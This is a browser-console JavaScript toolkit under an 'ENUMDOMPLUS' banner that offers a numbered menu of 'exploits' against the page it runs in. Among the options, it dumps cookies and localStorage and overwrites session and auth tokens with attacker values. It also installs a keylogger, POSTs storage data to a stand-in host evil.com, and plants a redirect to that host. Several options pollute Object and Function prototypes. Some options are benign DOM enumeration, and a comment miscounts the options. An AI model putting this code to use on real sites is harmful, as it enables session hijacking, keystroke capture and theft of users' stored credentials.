


 _______  _                 _______  ______   _______  _______  _______  _                 _______ 
(  ____ \( (    /||\     /|(       )(  __  \ (  ___  )(       )(  ____ )( \      |\     /|(  ____ \
| (    \/|  \  ( || )   ( || () () || (  \  )| (   ) || () () || (    )|| (      | )   ( || (    \/
| (__    |   \ | || |   | || || || || |   ) || |   | || || || || (____)|| |      | |   | || (_____ 
|  __)   | (\ \) || |   | || |(_)| || |   | || |   | || |(_)| ||  _____)| |      | |   | |(_____  )
| (      | | \   || |   | || |   | || |   ) || |   | || |   | || (      | |      | |   | |      ) |
| (____/\| )  \  || (___) || )   ( || (__/  )| (___) || )   ( || )      | (____/\| (___) |/\____) |
(_______/|/    )_)(_______)|/     \|(______/ (_______)|/     \||/       (_______/(_______)\_______)
                                                                                                   

                                     

// Paste into developer console for full menu of 24 options to enumerate the dom
(function () {
    // ✅ Table of available options
    const exploitOptions = [
        { id: 1, description: "Check if storage access is granted" },
        { id: 2, description: "Request storage access manually" },
        { id: 3, description: "Enumerate available cookies" },
        { id: 4, description: "Detect real-time storage access changes" },
        { id: 5, description: "List all localStorage keys" },
        { id: 6, description: "Modify session token in localStorage" },
        { id: 7, description: "Dump all localStorage data" },
        { id: 8, description: "Exploit third-party frames for storage access" },
        { id: 9, description: "Steal cookies from another frame" },
        { id: 10, description: "Inject keylogger via localStorage" },
        { id: 11, description: "Exfiltrate storage data to an attacker" },
        { id: 12, description: "Hijack authentication by replacing tokens" },
        { id: 13, description: "Detect weak Content Security Policy (CSP)" },
        { id: 14, description: "Detect anti-tracking storage protections" },
        { id: 15, description: "Persist worm-like JavaScript via localStorage" },
        { id: 16, description: "Basic Prototype Pollution Attack" },
        { id: 17, description: "Override hasOwnProperty for all objects" },
        { id: 18, description: "Create hidden admin property via __proto__" },
        { id: 19, description: "Modify constructor prototype globally" },
        { id: 20, description: "Break JSON.stringify via prototype override" },
        { id: 21, description: "List all global window properties" },
        { id: 22, description: "Enumerate all iframes and their sources" },
        { id: 23, description: "Dump all script tags and their sources" },
        { id: 24, description: "List all form fields and their names" },
        { id: 25, description: "Extract all links from the page" }
    ];

    //  Display available options in a nicely formatted table
    console.table(exploitOptions);

    //  Function to execute specific exploits
    window.enumerateDOM = async function (option) {
        console.log(`🚀 Running Exploit #${option}: ${exploitOptions[option - 1]?.description || "Invalid Option"}`);

        switch (option) {
            // 📌 1-15: Storage Access Exploits
            case 1:
                console.log("📌 Storage Access:", await document.hasStorageAccess());
                break;
            case 2:
                try {
                    await document.requestStorageAccess();
                    console.log("[*] Storage access granted");
                } catch (err) {
                    console.warn("[*] Storage access denied", err);
                }
                break;
            case 3:
                console.log("[-] Cookies:", document.cookie);
                break;
            case 4:
                setInterval(async () => console.log("📡 Storage Access:", await document.hasStorageAccess()), 5000);
                break;
            case 5:
                console.log("🗝️ Storage Keys:", Object.keys(localStorage));
                break;
            case 6:
                localStorage.setItem("session", "hacked-session-token");
                console.log("[-] Session Hijacked!");
                break;
            case 7:
                console.table({...localStorage});
                break;
            case 8:
                document.querySelectorAll("iframe").forEach(f => f.contentWindow.document.requestStorageAccess?.());
                break;
            case 9:
                document.querySelectorAll("iframe").forEach(f => 
                    f.contentWindow.document.hasStorageAccess?.().then(access => {
                        if (access) console.log("🍪 Third-Party Cookies:", f.contentWindow.document.cookie);
                    })
                );
                break;
            case 10:
                document.addEventListener("keydown", e => console.log(`🔑 Key Pressed: ${e.key}`));
                break;
            case 11:
                fetch("https://evil.com/log", { method: "POST", body: JSON.stringify(localStorage) });
                break;
            case 12:
                localStorage.setItem("authToken", "attacker-token");
                setTimeout(() => location.reload(), 5000);
                break;
            case 13:
                console.log("CSP Directives:", document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.content);
                break;
            case 14:
                navigator.storage.estimate().then(data => console.log("[+] Storage Quota:", data));
                break;
            case 15:
                localStorage.setItem("worm", "document.location='https://evil.com'");
                break;

            // 📌 16-20: Advanced Prototype Pollution Attacks
            case 16:
                Object.prototype.hacked = "Yes, global pollution!";
                console.log("[-] Prototype Pollution Successful:", {}.hacked);
                break;
            case 17:
                Object.prototype.hasOwnProperty = () => true;
                console.log("[-] hasOwnProperty Override Active!");
                break;
            case 18:
                Object.setPrototypeOf({}, { isAdmin: true });
                console.log("[-] Admin Access Granted?", {}.isAdmin);
                break;
            case 19:
                Function.prototype.constructor.prototype.hacked = "Global attack!";
                console.log("[-] Function Constructor Polluted:", Object.prototype.hacked);
                break;
            case 20:
                Object.prototype.toJSON = () => "Hacked JSON!";
                console.log("[+] JSON.stringify Attack:", JSON.stringify({}));
                break;

            // 📌 21-25: DOM Enumeration
            case 21:
                console.table(Object.keys(window));
                break;
            case 22:
                console.table([...document.querySelectorAll("iframe")].map(f => ({ Frame: f.src || "inline frame" })));
                break;
            case 23:
                console.table([...document.scripts].map(s => ({ Script: s.src || "inline script" })));
                break;
            case 24:
                console.table([...document.forms].map(f => ({ Form: f.name || "Unnamed", Fields: f.elements.length })));
                break;
            case 25:
                console.table([...document.links].map(l => ({ Text: l.innerText, URL: l.href })));
                break;

            default:
                console.warn("❌ Invalid Option Selected!");
        }
    };

    console.log("🚀 Use enumerateDOM(#) to run an exploit.");
})();

